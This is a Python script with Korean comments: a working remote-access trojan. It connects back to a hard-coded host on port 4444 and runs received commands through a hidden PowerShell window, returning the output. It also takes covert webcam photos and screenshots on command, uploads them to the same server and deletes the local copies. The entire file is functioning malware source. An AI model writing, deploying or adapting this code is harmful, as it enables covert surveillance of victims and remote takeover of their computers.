import socket  # 네트워크 소켓을 위한 라이브러리
import subprocess  # 외부 프로세스 실행을 위한 라이브러리
import time  # 시간 관련 기능을 위한 라이브러리
from PIL import ImageGrab  # 스크린샷을 캡처하기 위한 라이브러리
import cv2  # 컴퓨터 비전 작업을 위한 OpenCV 라이브러리
from pathlib import Path  # 파일 경로 작업을 위한 라이브러리
import requests  # HTTP 요청을 위한 라이브러리
import tempfile  # 임시 파일 및 디렉토리 작업을 위한 라이브러리
import os  # 운영 체제 관련 기능을 위한 라이브러리
from datetime import datetime  # 날짜 및 시간 작업을 위한 라이브러리

# 서버의 IP 주소와 포트를 설정
ip_addr = "192.168.186.128"
port = 4444


#
def capture_and_save_webcam_image():
    print("Initializing the camera...")  # 카메라 초기화 메시지 출력
    cam_port = 0  # 기본 카메라 포트 설정
    cam = cv2.VideoCapture(cam_port)  # 카메라 객체 생성
    try:
        time.sleep(2)  # 카메라가 켜질 시간을 주기 위해 2초 대기
        if not cam.isOpened():  # 카메라가 열리지 않았을 경우
            print("Error: Could not open the camera.")  # 오류 메시지 출력
            return None  # None 반환
        print("Camera opened successfully.")  # 카메라가 성공적으로 열렸다는 메시지 출력
        result, image = cam.read()  # 카메라에서 이미지를 캡처
        if result:  # 이미지 캡처가 성공했을 경우
            print("Webcam image captured successfully.")  # 성공 메시지 출력
            date_string = datetime.now().strftime(
                "%Y%m%d_%H%M%S"
            )  # 현재 날짜와 시간을 문자열로 포맷팅
            image_filename = f"webcam_image_{date_string}.png"  # 파일 이름 생성
            image_path = os.path.join(
                tempfile.gettempdir(), image_filename
            )  # 임시 디렉토리에 파일 경로 설정
            cv2.imwrite(image_path, image)  # 이미지를 파일로 저장
            print(f"Webcam image saved to: {image_path}")  # 저장된 경로 출력
            return image_path  # 이미지 경로 반환
        else:
            print(
                "Error: Failed to capture image from webcam."
            )  # 이미지 캡처 실패 메시지 출력
    except Exception as e:  # 예외 발생 시
        print(f"Error capturing webcam image: {e}")  # 오류 메시지 출력
    finally:  # 항상 실행
        cam.release()  # 카메라 해제
        print("Webcam released.")  # 카메라 해제 메시지 출력
    return None  # 실패 시 None 반환


#
def capture_and_save_screenshot():
    try:
        screenshot = ImageGrab.grab()  # 스크린샷 캡처
        current_datetime = datetime.now().strftime(
            "%Y%m%d_%H%M%S"
        )  # 현재 날짜와 시간을 문자열로 포맷팅
        screenshot_filename = f"screenshot_{current_datetime}.png"  # 파일 이름 생성
        screenshot_path = os.path.join(
            tempfile.gettempdir(), screenshot_filename
        )  # 임시 디렉토리에 파일 경로 설정
        screenshot.save(screenshot_path, "PNG")  # 스크린샷을 PNG 파일로 저장
        print(
            f"Screenshot captured and saved to: {screenshot_path}"
        )  # 저장된 경로 출력
        return screenshot_path  # 스크린샷 경로 반환
    except Exception as e:  # 예외 발생 시
        print(f"Error capturing screenshot: {e}")  # 오류 메시지 출력
        return None  # 실패 시 None 반환


#
def send_image_and_delete(image_path, upload_url):
    try:
        with open(image_path, "rb") as file:  # 이미지를 읽기 모드로 열기
            files = {
                "file": (Path(image_path).name, file)
            }  # 파일을 포함한 딕셔너리 생성
            response = requests.post(
                upload_url, files=files
            )  # 이미지 파일을 서버로 전송
            response.raise_for_status()  # 요청이 성공했는지 확인
            print(response.text)  # 서버 응답 출력

        os.remove(image_path)  # 이미지 파일 삭제
        print(f"Image file {image_path} deleted.")  # 파일 삭제 메시지 출력
    except requests.RequestException as e:  # HTTP 요청 예외 발생 시
        print(f"Error sending image: {e}")  # 오류 메시지 출력
    except OSError as e:  # OS 예외 발생 시
        print(f"Error deleting image: {e}")  # 오류 메시지 출력


#
def execute_powershell_command(command):
    try:
        powershell_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  # PowerShell 경로 설정
        proc = subprocess.Popen(  # PowerShell 명령 실행
            [powershell_path, command],  # 실행할 명령어 리스트
            stdout=subprocess.PIPE,  # 표준 출력 파이프 설정
            stderr=subprocess.PIPE,  # 표준 오류 파이프 설정
            stdin=subprocess.PIPE,  # 표준 입력 파이프 설정
            text=True,  # 텍스트 모드로 설정
            creationflags=subprocess.CREATE_NO_WINDOW,  # 창을 생성하지 않도록 설정
        )
        stdout, stderr = proc.communicate()  # 명령 실행 후 출력 및 오류 수집
        return stdout + stderr  # 출력과 오류를 합쳐서 반환
    except Exception as e:  # 예외 발생 시
        return f"Error executing command: {e}"  # 오류 메시지 반환


#
def main():
    upload_url = f"http://{ip_addr}/upload.php"  # 이미지 업로드 URL 설정
    while True:  # 무한 루프 시작
        client_socket = socket.socket(
            socket.AF_INET, socket.SOCK_STREAM
        )  # 클라이언트 소켓 생성
        try:
            client_socket.connect((ip_addr, port))  # 서버에 연결 시도
            print("Connected to the server!")  # 연결 성공 메시지 출력
            while True:  # 서버와의 통신 루프
                try:
                    data = client_socket.recv(4096)  # 서버로부터 데이터 수신
                    if not data:  # 수신한 데이터가 없으면
                        break  # 루프 종료
                    print(f"Received command: {data}")  # 수신한 명령
                    if data == b"webcam\n":  # 'webcam' 명령을 수신한 경우
                        saved_webcam_image_path = (
                            capture_and_save_webcam_image()
                        )  # 웹캠 이미지 캡처 및 저장
                        if (
                            saved_webcam_image_path
                        ):  # 이미지가 성공적으로 저장되었을 경우
                            send_image_and_delete(
                                saved_webcam_image_path, upload_url
                            )  # 이미지 전송 및 삭제
                    elif data == b"capture\n":  # 'capture' 명령을 수신한 경우
                        saved_screenshot_path = (
                            capture_and_save_screenshot()
                        )  # 스크린샷 캡처 및 저장
                        if (
                            saved_screenshot_path
                        ):  # 스크린샷이 성공적으로 저장되었을 경우
                            send_image_and_delete(
                                saved_screenshot_path, upload_url
                            )  # 스크린샷 전송 및 삭제
                    else:  # 그 외의 명령일 경우
                        command = data.decode(
                            "utf-8"
                        ).strip()  # 명령어를 디코딩하고 공백 제거
                        result = execute_powershell_command(
                            command
                        )  # PowerShell 명령 실행
                        client_socket.sendall(
                            result.encode()
                        )  # 실행 결과를 서버로 전송
                except Exception as e:  # 통신 예외 발생 시
                    print(f"Error: {e}")  # 오류 메시지 출력
                    break  # 루프 종료
            print("Retrying in 5 seconds...")  # 재시도 메시지 출력
            time.sleep(5)  # 5초 대기
        except Exception as e:  # 연결 예외 발생 시
            print(f"Connection error: {e}")  # 오류 메시지 출력
        finally:  # 항상 실행
            client_socket.close()  # 클라이언트 소켓 닫기
            print("Disconnected from the server.")  # 연결 종료 메시지 출력


#
if __name__ == "__main__":  # 스크립트가 직접 실행될 경우
    main()  # main 함수 실행
